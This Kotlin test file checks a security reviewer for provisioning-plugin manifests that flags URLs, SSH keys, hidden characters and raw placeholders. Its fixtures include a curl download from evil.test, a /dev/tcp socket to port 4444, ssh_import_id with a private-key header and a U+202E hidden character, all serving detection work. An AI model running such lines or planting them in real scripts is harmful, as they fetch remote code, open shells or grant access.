package net.metalstrapper.sparkwriter

import net.metalstrapper.sparkwriter.core.ConfigField
import net.metalstrapper.sparkwriter.core.ConfigOption
import net.metalstrapper.sparkwriter.core.HostEventSubscription
import net.metalstrapper.sparkwriter.core.ManifestMetadata
import net.metalstrapper.sparkwriter.core.ReturnDeliverySpec
import net.metalstrapper.sparkwriter.core.SparkManifest
import net.metalstrapper.sparkwriter.core.WorkflowAction
import net.metalstrapper.sparkwriter.fixtures.parseWorkflowFile
import net.metalstrapper.sparkwriter.manifest.ManifestRuntime
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class SparkPlugReviewTest {
    @Test
    fun urlInATemplateIsRedWithItsLine() {
        val review = reviewSparkPlug(plug(templates = mapOf("script" to "#!/bin/sh\necho hi\ncurl -fsS https://evil.test/x.sh -o /tmp/x\n")))
        val url = review.red.single { it.kind == ReviewKind.NetworkAddress }
        assertEquals("https://evil.test/x.sh", url.value)
        assertEquals("templates.script", url.path)
        assertEquals(3, url.line)
        assertEquals(UrlRole.InFile, url.urlRole)
        assertTrue(url.excerpt.startsWith("curl"))
        val document = review.documents.single()
        assertEquals(3, document.lineCount)
        assertTrue(document.spans.any { it.severity == ReviewSeverity.Red && document.text.substring(it.start, it.end) == "https://evil.test/x.sh" })
    }

    @Test
    fun urlFieldsAreRedEvenWhenTheyHoldAPlaceholder() {
        val review = reviewSparkPlug(
            plug(
                hostEvents = listOf(HostEventSubscription("write_complete", ReturnDeliverySpec(url = "https://collect.test/{{hostname}}"))),
                configFields = listOf(ConfigField(id = "hostname", label = "Hostname")),
            ),
        )
        val url = review.red.single()
        assertEquals(ReviewKind.NetworkAddress, url.kind)
        assertEquals(UrlRole.SendsData, url.urlRole)
        assertEquals("https://collect.test/{{hostname}}", url.value)
        assertEquals("hostname", review.amber.single { it.kind == ReviewKind.RawPlaceholder }.detail)
    }

    @Test
    fun sshKeyAnywhereIsRedWithItsFingerprint() {
        val key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILIjYUXbMiv/IFPxxXJ+kutlV29qLKmJGinQ3yinv5mi reviewer@test"
        val review = reviewSparkPlug(plug(configFields = listOf(ConfigField(id = "keys", label = "Keys", default = "[\"$key\"]"))))
        val found = review.red.single()
        assertEquals(ReviewKind.SshKey, found.kind)
        assertEquals("configFields[keys].default", found.path)
        assertEquals("ssh-ed25519  SHA256:hEabrcK8Dn9EdlgCR9t7lagii2vdXgg18GUJfpy2qbw  reviewer@test", found.detail)
    }

    @Test
    fun privateKeysAndKeyImportsAreRed() {
        val review = reviewSparkPlug(
            plug(
                templates = mapOf(
                    "user_data" to "#cloud-config\nssh_import_id: [gh:someone]\nwrite_files:\n  - content: |\n      -----BEGIN OPENSSH PRIVATE KEY-----\n",
                ),
            ),
        )
        assertEquals(setOf(ReviewKind.SshKeyImport, ReviewKind.PrivateKey), review.red.map { it.kind }.toSet())
    }

    @Test
    fun hiddenCharactersAreRedAndShownInTheExcerpt() {
        val review = reviewSparkPlug(plug(templates = mapOf("script" to "#!/bin/sh\necho ok ‮# hidden\n")))
        val hidden = review.red.single { it.kind == ReviewKind.HiddenText }
        assertEquals("⟦U+202E⟧", hidden.detail)
        assertTrue(hidden.excerpt, hidden.excerpt.contains("⟦U+202E⟧"))
        assertFalse(hidden.excerpt.contains('‮'))
    }

    @Test
    fun rawPlaceholdersAreAmberOnlyForTypedValues() {
        val template = listOf(
            "a = {{ free_text }}",
            "b = {{ free_text | toml_string }}",
            "c = {{ mode }}",
            "d = {{ generated_hash }}",
            "e = {{ Spark.mail.compact.url }}",
        ).joinToString("\n")
        val review = reviewSparkPlug(
            plug(
                templates = mapOf("answer" to template),
                configFields = listOf(
                    ConfigField(id = "free_text", label = "Free"),
                    ConfigField(id = "mode", label = "Mode", type = "select", options = listOf(ConfigOption("x", "X"))),
                ),
                actions = listOf(WorkflowAction(id = "hash", type = "hash_password", outputVar = "generated_hash")),
            ),
        )
        val raw = review.amber.filter { it.kind == ReviewKind.RawPlaceholder }
        assertEquals(listOf("free_text"), raw.map { it.detail })
        assertEquals(1, raw.single().line)
    }

    @Test
    fun ipLiteralsInFilesAreAmberButNotInsideUrls() {
        val review = reviewSparkPlug(plug(templates = mapOf("script" to "#!/bin/sh\nexec 3<>/dev/tcp/203.0.113.9/4444\ncurl http://198.51.100.7/x\n")))
        assertEquals(listOf("203.0.113.9"), review.amber.filter { it.kind == ReviewKind.IpAddress }.map { it.value })
        assertEquals(listOf("http://198.51.100.7/x"), review.red.map { it.value })
    }

    @Test
    fun recordedOriginIsNotPartOfTheReview() {
        val review = reviewSparkPlug(plug().copy(installOrigin = "https://example.test/plug.zip"))
        assertTrue(review.items.toString(), review.items.isEmpty())
    }

    @Test
    fun bundledProxmoxShowsTheIsoDownloadAndTheProxmoxRepositories() {
        val manifest = ManifestRuntime().parseWorkflowFile(
            listOf(File("app/bundled"), File("bundled")).first { it.isDirectory }.resolve("proxmox-autoinstall.sparkplug.yaml"),
        )
        val review = reviewSparkPlug(manifest)
        assertTrue(review.red.all { it.kind == ReviewKind.NetworkAddress })
        assertEquals(
            setOf("http://download.proxmox.com/debian/pve", "http://download.proxmox.com/debian/ceph-squid"),
            review.red.filter { it.urlRole == UrlRole.InFile }.map { it.value }.toSet(),
        )
        val download = review.red.single { it.urlRole == UrlRole.Download }
        assertTrue(download.value, download.value.startsWith("https://github.com/") && download.value.endsWith(".iso"))
        assertTrue(review.amber.none { it.kind == ReviewKind.RawPlaceholder })
        assertEquals(setOf("templates.answer_toml", "templates.firstboot_script"), review.documents.map { it.path }.toSet())
    }

    private fun plug(
        templates: Map<String, String> = emptyMap(),
        configFields: List<ConfigField> = emptyList(),
        hostEvents: List<HostEventSubscription> = emptyList(),
        actions: List<WorkflowAction> = emptyList(),
    ) = SparkManifest(
        version = "3.0",
        metadata = ManifestMetadata(id = "test", name = "Test"),
        templates = templates,
        configFields = configFields,
        hostEvents = hostEvents,
        actionPhases = if (actions.isEmpty()) emptyMap() else mapOf("on_iso_ready" to actions),
    )
}
